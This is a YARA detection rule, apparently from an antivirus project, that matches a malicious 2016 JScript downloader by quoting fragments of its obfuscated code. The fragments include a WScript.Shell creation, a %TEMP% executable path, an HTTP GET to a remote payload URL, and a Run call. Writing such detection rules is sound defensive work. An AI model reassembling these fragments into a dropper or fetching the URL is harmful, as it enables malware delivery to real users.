rule sig_20160328_5c51bc3cc36d88dbce2d224483376366 {
  meta:
    description = "datamaliciousorder - file 20160328_5c51bc3cc36d88dbce2d224483376366.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "678fabbdfa39810c474106e71f24c6318596a8db9f15b31b9ef494e26b227577"

  strings:
    $s1  = "function Sutoveuxiv() {return Vdjgyjjkak[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"XdQ1VsX5.exe\";};" fullword ascii
    $s2  = "do {WScript[Ktljcgn](Mhgfrouz() * 11)} while (Gaaxditfvk[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Cjkrnioqk(Ehhgwggs, Dtliwnfd){return Ehhgwggs - Dtliwnfd;};" fullword ascii
    $s4  = "var Vdjgyjjkak = function Gaoteruma() {return WScript[Hlecjwb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Gaaxditfvk[Xeavt](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s6  = "function Cxvad() {return ((Yjsrloirt == true) && (Yjsrloirt == Mgpcscja)) ? 1 : Psayml;};" fullword ascii
    $s7  = "function Ozgjbq(Jirjimskl){Vdjgyjjkak[\"Run\"](Jirjimskl, Psayml, Psayml);};" fullword ascii
    $s8  = "var Rupdwwnjwn = new this[\"Date\"]();" fullword ascii
    $s9  = "return Cjkrnioqk(Zgydmztas, Mequcqa);" fullword ascii
    $s10 = "function Sldfe(){return Mnxaxagf;};" fullword ascii
    $s11 = "function Mhgfrouz(){return 22;};" fullword ascii
    $s12 = "var Ygargs = false;" fullword ascii
    $s13 = "var Yjsrloirt = false;" fullword ascii
    $s14 = "function Atikceb(Uufmmtvk) {var Ybdpd = (1, 2, 3, 4, 5, Uufmmtvk); return Ybdpd;};" fullword ascii
    $s15 = " while (Axqbicmzri){" fullword ascii
    $s16 = "Mgpcscja = true; " fullword ascii
    $s17 = "var Mgpcscja = false;" fullword ascii
    $s18 = "function Knxpkxl()" fullword ascii
    $s19 = "Yjsrloirt = true; " fullword ascii
    $s20 = "function Ikadu(){return Hlecjwb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}